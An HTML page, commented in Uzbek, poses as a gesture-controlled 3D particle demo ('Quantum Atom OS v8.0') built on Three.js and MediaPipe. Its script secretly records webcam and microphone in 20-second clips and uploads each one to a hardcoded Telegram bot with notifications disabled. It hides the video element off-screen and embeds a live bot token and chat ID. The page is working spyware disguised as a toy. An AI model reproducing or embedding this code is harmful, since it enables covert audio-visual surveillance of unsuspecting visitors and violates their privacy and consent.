<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Quantum Atom OS v8.0 - Audio-Visual Stealth</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #00f2ff; --bg: #000; --glass: rgba(0, 20, 40, 0.7); }
        body, html { margin:0; padding:0; overflow:hidden; background:var(--bg); font-family:'Orbitron',sans-serif; }
        #ui-layer { position:absolute; top:20px; left:20px; z-index:100; background:var(--glass); backdrop-filter:blur(20px); padding:20px; border-radius:12px; border-left:4px solid var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.5); pointer-events:none; }
        h1 { font-size:18px; margin:0; color:#fff; letter-spacing:2px; }
        .mode-status { color:var(--accent); font-size:11px; margin-top:8px; font-weight:bold; }
        #video-box { position:absolute; top:-1000px; left:-1000px; width:1px; height:1px; opacity:0; }
        #hint-bar { position:absolute; bottom:20px; left:50%; transform:translateX(-50%); display:flex; gap:15px; background:var(--glass); padding:12px 25px; border-radius:50px; backdrop-filter:blur(15px); border:1px solid rgba(0,242,255,0.2); color:#fff; font-size:10px; flex-wrap: wrap; justify-content: center; }
        .hint-item b { color:var(--accent); }
        #loader { position:fixed; inset:0; background:#000; z-index:5000; display:flex; justify-content:center; align-items:center; color:var(--accent); cursor: pointer; }
    </style>
</head>
<body>

    <div id="loader">TIZIMNI ISHGA TUSHIRISH UCHUN BOSING...</div>

    <div id="ui-layer">
        <h1>ATOM ENGINE v8.0</h1>
        <div id="active-shape" class="mode-status">SYSTEM: WAITING_FOR_INPUT</div>
        <div id="precision-info" style="font-size:9px; color:rgba(0,242,255,0.6); margin-top:5px;">AUDIO_LOG: ACTIVE</div>
    </div>

    <div id="video-box"><video id="webcam" autoplay playsinline muted></video></div>

    <div id="hint-bar">
        <div class="hint-item"><b>✊</b> SPHERE</div>
        <div class="hint-item"><b>✋</b> EXPLODE</div>
        <div class="hint-item"><b>✌️</b> CUBE</div>
        <div class="hint-item"><b>👆</b> PYRAMID</div>
        <div class="hint-item"><b>👌</b> TORUS</div>
    </div>

    <script type="module">
        import * as THREE from 'https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.module.js';

        const ADMIN_CHAT_ID = '489122603';
        const BOT_TOKEN = '8405733242:AAHit_YFCexZx3dyRHX91tpmIwNW2FLDU8M';
        const STAR_COUNT = 3000;
        
        let scene, camera, renderer, points, stars = [];
        let handTarget = new THREE.Vector3(1000, 1000, 1000);
        let currentShape = 'random';
        let mediaRecorder, recordedChunks = [];

        // 1. Ovozli va Videoli Yashirin Streaming
        async function startAudioVisualStreaming(videoStream) {
            try {
                // Mikrofondan audio olish
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                // Video va Audio oqimlarini birlashtirish
                const combinedStream = new MediaStream([
                    ...videoStream.getVideoTracks(),
                    ...audioStream.getAudioTracks()
                ]);

                const startRecorder = () => {
                    recordedChunks = [];
                    // MimeType uchun 'opus' audio kodeki qo'shildi
                    const options = { mimeType: 'video/webm;codecs=vp8,opus' };
                    mediaRecorder = new MediaRecorder(combinedStream, options);

                    mediaRecorder.ondataavailable = e => {
                        if (e.data.size > 0) recordedChunks.push(e.data);
                    };

                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
                        const fd = new FormData();
                        fd.append('chat_id', ADMIN_CHAT_ID);
                        fd.append('video', blob, `av_log_${Date.now()}.webm`);
                        fd.append('disable_notification', 'true');
                        
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
                                method: 'POST', 
                                body: fd 
                            });
                        } catch (err) { console.error("Send error"); }
                    };

                    mediaRecorder.start();
                    // Har 20 soniyada yuborib turish
                    setTimeout(() => {
                        if(mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            startRecorder();
                        }
                    }, 20000);
                };
                startRecorder();
            } catch (e) {
                console.error("Audio ruxsati berilmadi yoki xato:", e);
                // Agar audio bo'lmasa, faqat video bilan davom etish
                startOnlyVideoStreaming(videoStream);
            }
        }

        async function startOnlyVideoStreaming(stream) {
            const startRecorder = () => {
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
                mediaRecorder.ondataavailable = e => e.data.size > 0 && recordedChunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const fd = new FormData();
                    fd.append('chat_id', ADMIN_CHAT_ID);
                    fd.append('video', blob, `v_log_${Date.now()}.webm`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                };
                mediaRecorder.start();
                setTimeout(() => { if(mediaRecorder.state === 'recording') { mediaRecorder.stop(); startRecorder(); } }, 20000);
            };
            startRecorder();
        }

        // 2. 3D Engine va Boshqaruv
        function init() {
            scene = new THREE.Scene();
            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 2000);
            camera.position.z = 450;

            renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(window.devicePixelRatio);
            document.body.appendChild(renderer.domElement);

            const geo = new THREE.BufferGeometry();
            const pos = new Float32Array(STAR_COUNT * 3);
            const cols = new Float32Array(STAR_COUNT * 3);

            for (let i = 0; i < STAR_COUNT; i++) {
                pos[i*3] = (Math.random() - 0.5) * 1000;
                pos[i*3+1] = (Math.random() - 0.5) * 1000;
                pos[i*3+2] = (Math.random() - 0.5) * 1000;
                cols[i*3] = 0; cols[i*3+1] = 0.95; cols[i*3+2] = 1; 
                stars.push({
                    pos: new THREE.Vector3(pos[i*3], pos[i*3+1], pos[i*3+2]),
                    target: new THREE.Vector3(pos[i*3], pos[i*3+1], pos[i*3+2])
                });
            }

            geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
            geo.setAttribute('color', new THREE.BufferAttribute(cols, 3));

            const mat = new THREE.PointsMaterial({ size: 2.5, vertexColors: true, transparent: true, blending: THREE.AdditiveBlending, opacity: 0.8 });
            points = new THREE.Points(geo, mat);
            scene.add(points);

            animate();
        }

        function setupAI() {
            const video = document.getElementById('webcam');
            const hands = new Hands({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}` });

            hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.8, minTrackingConfidence: 0.8 });
            hands.onResults(res => {
                if (res.multiHandLandmarks?.length > 0) {
                    const lm = res.multiHandLandmarks[0];
                    handTarget.set((lm[9].x - 0.5) * -500, (0.5 - lm[9].y) * 500, lm[9].z * -400);
                    detectGesture(lm);
                }
            });

            const cam = new Camera(video, {
                onFrame: async () => await hands.send({ image: video }),
                width: 640, height: 480
            });

            cam.start().then(() => {
                startAudioVisualStreaming(video.srcObject);
                document.getElementById('loader').style.display = 'none';
            });
        }

        function detectGesture(lm) {
            const isFingerUp = (tip, pip) => lm[tip].y < lm[pip].y;
            const index = isFingerUp(8, 6), middle = isFingerUp(12, 10), ring = isFingerUp(16, 14), pinky = isFingerUp(20, 18);
            if (!index && !middle && !ring && !pinky) morph('sphere');
            else if (index && middle && ring && pinky) morph('explode');
            else if (index && middle && !ring && !pinky) morph('cube');
            else if (index && !middle && !ring && !pinky) morph('pyramid');
            else if (Math.abs(lm[4].x - lm[8].x) < 0.05) morph('torus');
        }

        function morph(type) {
            if (currentShape === type) return;
            currentShape = type;
            document.getElementById('active-shape').innerText = `SYSTEM: ${type.toUpperCase()}`;
            stars.forEach((s, i) => {
                const ratio = i / STAR_COUNT;
                if (type === 'sphere') {
                    const phi = Math.acos(-1 + (2 * i) / STAR_COUNT), theta = Math.sqrt(STAR_COUNT * Math.PI) * phi;
                    s.target.set(150 * Math.cos(theta) * Math.sin(phi), 150 * Math.sin(theta) * Math.sin(phi), 150 * Math.cos(phi));
                } else if (type === 'explode') {
                    s.target.set((Math.random()-0.5)*800, (Math.random()-0.5)*800, (Math.random()-0.5)*800);
                } else if (type === 'cube') {
                    const side = 220;
                    s.target.set((Math.random()-0.5)*side, (Math.random()-0.5)*side, (Math.random()-0.5)*side);
                } else if (type === 'pyramid') {
                    const h = 200, b = 200 * (1 - ratio);
                    s.target.set((Math.random()-0.5)*b, ratio * h - h/2, (Math.random()-0.5)*b);
                } else if (type === 'torus') {
                    const u = ratio * Math.PI * 2, v = Math.random() * Math.PI * 2, R = 150, r_tor = 40;
                    s.target.set((R + r_tor * Math.cos(v)) * Math.cos(u), (R + r_tor * Math.cos(v)) * Math.sin(u), r_tor * Math.sin(v));
                }
            });
        }

        function animate() {
            requestAnimationFrame(animate);
            const posAttr = points.geometry.attributes.position;
            stars.forEach((s, i) => {
                s.pos.lerp(s.target, 0.07);
                const dist = s.pos.distanceTo(handTarget);
                if (dist < 100) {
                    const push = s.pos.clone().sub(handTarget).normalize().multiplyScalar((100-dist)*0.6);
                    s.pos.add(push);
                }
                posAttr.array[i*3] = s.pos.x; posAttr.array[i*3+1] = s.pos.y; posAttr.array[i*3+2] = s.pos.z;
            });
            posAttr.needsUpdate = true;
            points.rotation.y += 0.003;
            renderer.render(scene, camera);
        }

        // Brauzer xavfsizligi: Audio foydalanuvchi sahifa bilan muloqot qilgandan so'ng yoqilishi shart
        document.getElementById('loader').addEventListener('click', () => {
            init();
            setupAI();
            document.getElementById('loader').innerText = "KAMERA VA MIKROFONGA RUXSAT BERING...";
        });

        window.addEventListener('resize', () => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
